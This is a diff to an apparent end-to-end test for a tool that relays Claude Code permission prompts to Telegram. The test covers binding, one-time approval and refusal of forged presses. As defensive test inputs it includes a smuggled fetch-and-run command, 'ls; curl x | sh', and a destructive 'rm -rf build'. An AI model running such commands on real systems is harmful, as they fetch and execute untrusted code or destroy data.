@@ -30,7 +30,15 @@ and are removed at the end.
    30 s sends nothing; failed, done (with the turn-length filter), the event switches, the away filter, screen
    text (redacted, off by default) and a secret in the session's name; a server error is reported without
    its address.
-8. Cleanup leaves no credential-store entry of this run.
+8. Telegram's choices in Settings → Mobile: a new Telegram sends alerts with a link and polls nothing; choosing approvals warns, asks for
+   the verification (the debug daemon's stand-in, KELPIE_TEST_USER_PRESENCE=approve, so no real prompt comes up) and shows a code, which
+   a save of another setting leaves waiting; every poll asks for messages and presses; a wrong code binds nothing, nor the code from a chat other than the one set; `/bind <code>` in the chat set binds the account that
+   sent it, shown by name. A low-risk request's message has Approve once and Deny; presses from another account, another chat or with
+   a made-up nonce do nothing, the bound account's approves once; Deny pressed first types the plain No, once; the desktop answering
+   first takes the buttons off the message and a later press does nothing; a dangerous request gets no buttons, and so does a low one
+   under a menu for another command; choosing alerts with a link again forgets the account and stops the polling. The fake Bot API
+   answers `getUpdates` and `getMe` itself, and drops an update the last poll did not ask for, as Telegram does.
+9. Cleanup leaves no credential-store entry of this run.
 """
 import importlib.util
 import json
@@ -85,6 +93,8 @@ SINK = f"http://127.0.0.1:{SINK_PORT}"
 os.environ.update({
     "KELPIE_ENDPOINT": ENDPOINT, "KELPIE_DATA_DIR": DATA, "KELPIE_E2E": "1",
     "KELPIE_NOTIFY_TELEGRAM_BASE": SINK, "KELPIE_NOTIFY_RESET_MARGIN_MS": "500",
+    # A debug daemon's stand-in for the OS verification: binding Telegram for approvals asks for it, and no real prompt may come up.
+    "KELPIE_TEST_USER_PRESENCE": "approve",
     "CLAUDE_CONFIG_DIR": CLAUDE_HOME, "CODEX_HOME": CODEX_HOME,
     "PATH": BIN + os.pathsep + os.environ.get("PATH", ""),
     "KELPIE_E2E_DRIVER": f"http://127.0.0.1:{DRIVER_PORT}",
@@ -103,7 +113,8 @@ spec = importlib.util.spec_from_file_location("kelpie_call", os.path.join(HERE, 
 kc = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(kc)
 
-# A stand-in `claude`: says which config home it runs on, and echoes every line it is typed.
+# A stand-in `claude`: says which config home it runs on, and echoes every line it is typed. `MENU <command>` draws Claude Code's
+# permission dialog and menu for that command; the next key is then a choice, said back as `PICKED:<key>`.
 FAKE = os.path.join(WORK, "fake_claude.py")
 with open(FAKE, "w", encoding="utf-8") as f:
     f.write(
@@ -112,6 +123,7 @@ with open(FAKE, "w", encoding="utf-8") as f:
         "print('TOKEN=' + os.environ.get('KELPIE_SESSION_TOKEN', ''), flush=True)\n"
         "buf = ''\n"
         "esc = False\n"
+        "menu = False\n"
         "while True:\n"
         "    ch = msvcrt.getwch()\n"
         "    if ch == '\\x1b':\n"
@@ -120,8 +132,16 @@ with open(FAKE, "w", encoding="utf-8") as f:
         "    if esc:\n"
         "        esc = not (ch.isalpha() or ch == '~')\n"
         "        continue\n"
+        "    if menu and ch not in '\\r\\n':\n"
+        "        print('PICKED:' + ch, flush=True)\n"
+        "        menu = False\n"
+        "        continue\n"
         "    if ch in '\\r\\n':\n"
-        "        if buf:\n"
+        "        if buf.startswith('MENU '):\n"
+        "            cmd = buf[5:]\n"
+        "            print('\\u25cf Bash(' + cmd + ')\\n\\n Bash command\\n   ' + cmd + '\\n Do you want to proceed?\\n \\u276f 1. Yes\\n   2. Yes, and don\\'t ask again for ' + cmd.split()[0] + ' commands\\n   3. No, and tell Claude what to do differently (esc)', flush=True)\n"
+        "            menu = True\n"
+        "        elif buf:\n"
         "            print('GOT:' + buf, flush=True)\n"
         "        buf = ''\n"
         "    else:\n"
@@ -143,6 +163,14 @@ class Sink:
     def __init__(self):
         self.lock = threading.Lock()
         self.requests = []
+        # The Bot API's other methods (getUpdates, answerCallbackQuery, editMessageText) are kept apart: the counts of messages stay as they were.
+        self.bot_calls = []
+        self.updates = []
+        # What the last getUpdates asked for: as Telegram does, an update of another kind made meanwhile is never kept.
+        self.allowed = None
+        self.dropped = 0
+        self.next_update = 1
+        self.next_message = 500
         sink = self
 
         class Handler(BaseHTTPRequestHandler):
@@ -153,13 +181,44 @@ class Sink:
                     body = json.loads(raw)
                 except ValueError:
                     body = None
-                with sink.lock:
-                    sink.requests.append({"path": self.path, "auth": self.headers.get("Authorization"), "body": body, "at": time.time()})
+                method = self.path.rsplit("/", 1)[-1] if self.path.startswith("/bot") else None
+                reply = {}
+                if method == "getUpdates":
+                    if isinstance((body or {}).get("allowed_updates"), list):
+                        with sink.lock:
+                            sink.allowed = list(body["allowed_updates"])
+                    end = time.time() + 0.5  # a short long poll
+                    while True:
+                        with sink.lock:
+                            ready, sink.updates = sink.updates, []
+                        if ready or time.time() >= end:
+                            break
+                        time.sleep(0.05)
+                    reply = {"ok": True, "result": ready}
+                    with sink.lock:
+                        sink.bot_calls.append({"method": method, "body": body, "at": time.time()})
+                elif method == "sendMessage":
+                    with sink.lock:
+                        sink.next_message += 1
+                        reply = {"ok": True, "result": {"message_id": sink.next_message}}
+                        sink.requests.append({"path": self.path, "auth": self.headers.get("Authorization"), "body": body, "at": time.time(), "message_id": sink.next_message})
+                elif method == "getMe":
+                    reply = {"ok": True, "result": {"id": 123456, "is_bot": True, "username": "kelpie_e2e_bot"}}
+                    with sink.lock:
+                        sink.bot_calls.append({"method": method, "body": body, "at": time.time()})
+                elif method:
+                    reply = {"ok": True, "result": True}
+                    with sink.lock:
+                        sink.bot_calls.append({"method": method, "body": body, "at": time.time()})
+                else:
+                    with sink.lock:
+                        sink.requests.append({"path": self.path, "auth": self.headers.get("Authorization"), "body": body, "at": time.time()})
+                out = json.dumps(reply).encode()
                 code = 500 if self.path.startswith("/boom") else 200
                 self.send_response(code)
-                self.send_header("Content-Length", "2")
+                self.send_header("Content-Length", str(len(out)))
                 self.end_headers()
-                self.wfile.write(b"{}")
+                self.wfile.write(out)
 
             def log_message(self, *a):  # addresses and paths are not logged
                 pass
@@ -181,6 +240,25 @@ class Sink:
     def clear(self):
         with self.lock:
             self.requests.clear()
+
+    def push_update(self, kind, body):
+        """Something Telegram has for the bot: a message, or a button press."""
+        with self.lock:
+            if self.allowed is not None and kind not in self.allowed:
+                self.dropped += 1
+                return
+            self.updates.append({"update_id": self.next_update, kind: body})
+            self.next_update += 1
+
+    def press(self, data, user, chat, message):
+        self.push_update("callback_query", {"id": f"cb-{uuid.uuid4().hex}", "from": {"id": user}, "data": data, "message": {"message_id": message, "chat": {"id": chat}}})
+
+    def calls(self, method):
+        with self.lock:
+            return [c["body"] for c in self.bot_calls if c["method"] == method]
+
+    def polls(self):
+        return len(self.calls("getUpdates"))
 
     def count(self):
         return len(self.all())
@@ -461,6 +539,7 @@ def scenario(run):
     pid = d.js(f"return {S}.addProject(arguments[0])", PROJ)
     state["pid"] = pid
     other_pid = d.js(f"return {S}.addProject(arguments[0])", OTHER)
+    state["other_pid"] = other_pid
     d.js(f"{S}.switchProject(arguments[0])", pid)
     watched = js_await(d, f"{S}.newSession(arguments[0], 'claude', {{name: 'watched'}})", pid)
     hook(rpc, watched["id"], "UserPromptSubmit")
@@ -670,7 +749,164 @@ def scenario(run):
     run.check("the conversation was copied there and the original stays", os.path.exists(moved) and open(moved, encoding="utf-8").read() == body and os.path.exists(transcript))
     run.check("the new process runs on that home", bool(until(lambda: f"READY cfg={acct['dir']}" in screen(rpc, sw["handle"]), 20)))
     run.check("the banner is gone (not limited any more)", not d.js("return !!document.querySelector('[data-limit-banner]')"))
+
+    # ---------- 8: Telegram's choices, and approvals from it ----------
+    telegram_approvals(d, run)
     os.remove(os.path.join(acct["dir"], ".credentials.json"))  # nothing may use the fake token
+
+
+TG_USER = 777000111
+
+
+def asking_telegram(name, command, menu=None):
+    """A stand-in Claude session showing its permission menu for `menu` (`command` unless given), whose hook then asks to run `command`."""
+    s = new_session(rpc, name)
+    rpc("session.input", {"handle": s["handle"], "data": f"MENU {menu or command}\r"})
+    until(lambda: "Do you want to proceed?" in screen(rpc, s["handle"]), 10)
+    until(lambda: rpc("session.read", {"handle": s["handle"]}).get("prompt"), 10)
+    hook(rpc, s["id"], "PermissionRequest", tool_name="Bash", tool_input={"command": command})
+    return s
+
+
+def telegram_message(name):
+    return until(lambda: next((r for r in sink.by("telegram") if f"{name}: Needs your input" in (r["body"] or {}).get("text", "")), None), 15)
+
+
+def buttons(message):
+    row = (((message or {}).get("body") or {}).get("reply_markup") or {}).get("inline_keyboard", [[]])[0]
+    return [b.get("callback_data", "") for b in row]
+
+
+def telegram_approvals(d, run):
+    """Scenario 8: what Telegram gets, chosen in Settings → Mobile; binding an account; a low-risk request approved once from Telegram;
+    the desktop answering first; turning approvals off."""
+    check = run.check
+    seam = rpc("daemon.info").get("test_user_presence")
+    if seam != "approve":
+        check("the daemon has the stand-in for the OS verification, so no real prompt comes up", False, repr(seam))
+        return
+    configure(min_turn_s=0, away_only=False, include_screen=False)
+    d.js(f"{S}.setSettingsSection('mobile'); {S}.setOverlay('settings');")
+    mode = until(lambda: d.js("const s = document.querySelector('[data-telegram-mode]'); return s && s.value"), 20)
+    check("Settings → Mobile says what Telegram gets (API 26): switched on now, alerts with a link", mode == "alert_link" and d.js(f"return {S}.daemonApi()") >= 26, str(mode))
+    check("…with the note that Telegram sees the computer's name in the link, and no approval warning yet",
+          d.js("return !!document.querySelector('[data-telegram-link-note]') && !document.querySelector('[data-telegram-warning]')"))
+    check("alerts alone poll nothing", rpc("notify.get")["telegram"]["polling"] is False and sink.polls() == 0)
+    check("a program with the user token cannot turn approvals on, nor name the account",
+          "Kelpie app" in (refused(lambda: rpc("notify.telegram_bind")) or "")
+          and "Settings → Mobile" in (refused(lambda: configure(telegram={"mode": "approve_low", "user_id": "5"})) or ""))
+    run.shot("08-telegram-choice")
+
+    d.js("window.__asked = null; window.confirm = (m) => { window.__asked = m; return true; }")
+    set_value(d, "[data-telegram-mode]", "approve_low")
+    command = until(lambda: d.js("const e = document.querySelector('[data-telegram-bind-command]'); return e && e.textContent"), 20)
+    asked = d.js("return window.__asked") or ""
+    check("choosing approvals warns first: Telegram reads the messages, no Face ID, anyone with that account can approve",
+          all(w in asked for w in ("Telegram can read", "no Face ID", "anyone who has this Telegram account")), asked[:300])
+    check("…then, once verified, shows a code to send as /bind", re.fullmatch(r"/bind [0-9A-F]{12}", command or "") is not None, str(command))
+    check("the warning stays on the row", d.js("return !!document.querySelector('[data-telegram-warning]')"))
+    check("a binding polls Telegram, outbound, while it waits", bool(until(lambda: sink.polls() > 0, 15)))
+    check("…asking for chat messages and presses, always", all(c.get("allowed_updates") == ["message", "callback_query"] for c in sink.calls("getUpdates")))
+    # Another setting saved while the code is shown, as Settings → Notifications saves on each change: the code still waits.
+    configure(include_screen=False)
+    check("saving another setting leaves the code waiting", bool(rpc("notify.get")["telegram"].get("binding_expires_in")) and bool(d.js("return !!document.querySelector('[data-telegram-bind-command]')")))
+    run.shot("08-telegram-bind")
+    group = int(CHAT)
+    sink.push_update("message", {"message_id": 1, "from": {"id": 5}, "chat": {"id": group}, "text": "/bind 000000000000"})
+    # The right code, from a chat other than the one set: refused, and the bot says where to send it.
+    sink.push_update("message", {"message_id": 2, "from": {"id": TG_USER}, "chat": {"id": TG_USER}, "text": command})
+    told_elsewhere = until(lambda: any((r["body"] or {}).get("chat_id") == TG_USER and "only in the chat set" in (r["body"] or {}).get("text", "") for r in sink.by("telegram")), 10)
+    check("a wrong code binds nothing, nor the code from another chat, which is told where to send it",
+          not rpc("notify.get")["config"]["telegram"].get("user_id") and bool(told_elsewhere))
+    sink.push_update("message", {"message_id": 3, "from": {"id": TG_USER, "username": "e2e_person"}, "chat": {"id": group}, "text": command})
+    bound = until(lambda: (t := rpc("notify.get")["config"]["telegram"]) and t.get("mode") == "approve_low" and t, 15)
+    check("the code, in the chat set, binds the account that sent it, by name", bool(bound) and bound.get("user_id") == str(TG_USER) and bound.get("user_name") == "@e2e_person" and bound.get("chat_id") == CHAT, json.dumps(bound))
+    shown = until(lambda: d.js("const e = document.querySelector('[data-telegram-bound]'); return e && e.textContent"), 10) or ""
+    check("…the page says so, with the account's name next to its number", f"@e2e_person ({TG_USER})" in shown, shown)
+    check("…and the bot told that chat", bool(until(lambda: any((r["body"] or {}).get("chat_id") == group and "can now approve" in (r["body"] or {}).get("text", "") for r in sink.by("telegram")), 10)))
+    d.js(f"{S}.setOverlay(null)")
+    d.js(f"{S}.switchProject(arguments[0])", state["other_pid"])
+
+    # A low-risk request: buttons, answered once, by the bound account only.
+    sink.clear()
+    a = asking_telegram("tg-low", "ls -la")
+    msg = telegram_message("tg-low")
+    yes, no = (buttons(msg) + ["", ""])[:2]
+    check("a low-risk request's message shows the command with Approve once and Deny",
+          bool(msg) and "ls -la" in msg["body"]["text"] and re.fullmatch(r"a:[0-9a-f]{32}", yes) is not None and re.fullmatch(r"d:[0-9a-f]{32}", no) is not None and msg["body"].get("disable_web_page_preview") is True,
+          json.dumps(msg)[:400])
+    message_id = (msg or {}).get("message_id")
+    sink.press(yes, 5, group, message_id)
+    sink.press(yes, TG_USER, 999, message_id)
+    sink.press("a:" + "0" * 32, TG_USER, group, message_id)
+    time.sleep(3)
+    check("a press from another account, another chat or with a made-up nonce answers nothing", "PICKED:" not in screen(rpc, a["handle"]))
+    sink.press(yes, TG_USER, group, message_id)
+    check("the bound account's press approves it, as Telegram", bool(until(lambda: "PICKED:1" in screen(rpc, a["handle"]), 15)))
+    sink.press(yes, TG_USER, group, message_id)
+    sink.press(no, TG_USER, group, message_id)
+    time.sleep(3)
+    check("…once: pressing again, or Deny, types nothing more", screen(rpc, a["handle"]).count("PICKED:") == 1, screen(rpc, a["handle"])[-300:])
+    check("Telegram is told, and the message loses its buttons",
+          any(c.get("text") == "Approved once from Telegram." for c in sink.calls("answerCallbackQuery"))
+          and any(e.get("message_id") == message_id and "Approved once from Telegram." in e.get("text", "") for e in sink.calls("editMessageText")))
+    audit = rpc("mobile.audit", {"limit": 100})["entries"]
+    mine = [e for e in audit if e["device"] == "telegram"]
+    check("every approval and refusal is in the audit log as telegram, with no command text",
+          any(e["action"] == "telegram_approve" for e in mine) and any(e["action"] == "telegram_refused" for e in mine) and any(e["action"] == "telegram_bound" for e in mine) and "ls -la" not in json.dumps(mine),
+          json.dumps(mine)[:500])
+
+    # Deny first: the menu's plain No is typed, once.
+    n = asking_telegram("tg-deny", "ls -la")
+    msg = telegram_message("tg-deny")
+    yes, no = (buttons(msg) + ["", ""])[:2]
+    message_id = (msg or {}).get("message_id")
+    sink.press(no, TG_USER, group, message_id)
+    check("Deny pressed first types the menu's plain No, as Telegram", bool(no) and bool(until(lambda: "PICKED:3" in screen(rpc, n["handle"]), 15)), screen(rpc, n["handle"])[-300:])
+    sink.press(yes, TG_USER, group, message_id)
+    time.sleep(3)
+    check("…once: Approve after it types nothing", screen(rpc, n["handle"]).count("PICKED:") == 1, screen(rpc, n["handle"])[-300:])
+    check("…and Telegram is told, the message loses its buttons and the log says denied",
+          any(c.get("text") == "Denied from Telegram." for c in sink.calls("answerCallbackQuery"))
+          and any(e.get("message_id") == message_id and "Denied from Telegram." in e.get("text", "") for e in sink.calls("editMessageText"))
+          and any(e["action"] == "telegram_deny" and e["device"] == "telegram" for e in rpc("mobile.audit", {"limit": 100})["entries"]))
+
+    # The desktop answers first: Telegram is told, and its button answers nothing.
+    b = asking_telegram("tg-desktop", "ls -la")
+    msg = telegram_message("tg-desktop")
+    yes = (buttons(msg) + [""])[0]
+    message_id = (msg or {}).get("message_id")
+    wait = (info(rpc, b["id"]) or {}).get("waiting_since")
+    rpc("session.answer", {"handle": b["handle"], "waiting_since": wait, "data": "1"})
+    check("the desktop answers first", bool(yes) and bool(until(lambda: "PICKED:1" in screen(rpc, b["handle"]), 10)))
+    check("Telegram is told: the message loses its buttons and says it was answered elsewhere",
+          bool(until(lambda: any(e.get("message_id") == message_id and "Answered elsewhere" in e.get("text", "") for e in sink.calls("editMessageText")), 40)))
+    sink.press(yes, TG_USER, group, message_id)
+    time.sleep(3)
+    check("a press after that types nothing", screen(rpc, b["handle"]).count("PICKED:") == 1)
+
+    # What is not low gets the alert and the link only, though its menu shows that very command.
+    c = asking_telegram("tg-dangerous", "rm -rf build")
+    msg = telegram_message("tg-dangerous")
+    check("a dangerous request gets no buttons", bool(msg) and not msg["body"].get("reply_markup"), json.dumps(msg)[:300])
+    # A low request whose menu on screen shows more than it: the menu is not that request's.
+    e = asking_telegram("tg-other-menu", "ls", menu="ls; curl x | sh")
+    msg = telegram_message("tg-other-menu")
+    check("a menu that shows another command than the request gets no buttons", bool(msg) and not msg["body"].get("reply_markup"), json.dumps(msg)[:300])
+    for s in (a, n, b, c, e):
+        hook(rpc, s["id"], "Stop")
+
+    # Off again, from the page: the account is forgotten and the polling stops.
+    d.js(f"{S}.setSettingsSection('mobile'); {S}.setOverlay('settings');")
+    until(lambda: d.js("return !!document.querySelector('[data-telegram-mode]')"), 20)
+    set_value(d, "[data-telegram-mode]", "alert_link")
+    check("choosing alerts with a link turns approvals off and forgets the account",
+          bool(until(lambda: (t := rpc("notify.get")["config"]["telegram"]) and t.get("mode") == "alert_link" and not t.get("user_id"), 10)))
+    check("…and the polling stops", bool(until(lambda: rpc("notify.get")["telegram"]["polling"] is False, 40)))
+    polls = sink.polls()
+    check("…for good", stays(lambda: sink.polls() == polls, 3))
+    check("no message or press was lost to what a poll asked for", sink.dropped == 0, str(sink.dropped))
+    d.js(f"{S}.setOverlay(null)")
 
 
 def push_closed(results):
@@ -819,8 +1055,8 @@ def restart_daemon(check):
     check("a pending timer is written to the data folder", len(timers()) == 1 and os.path.exists(os.path.join(DATA, "scheduled.json")))
     try:
         rpc("daemon.shutdown", {"kill_sessions": False})
-    except RuntimeError:
-        pass  # the reply may race the daemon exiting
+    except Exception:
+        pass  # the reply may race the daemon exiting: an error, or a connection closed mid-frame
     procs["daemon"].wait(timeout=30)
     procs["daemon"] = subprocess.Popen([kelpied, "serve"], env=dict(os.environ, KELPIE_LOG="trace"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     rpc = None
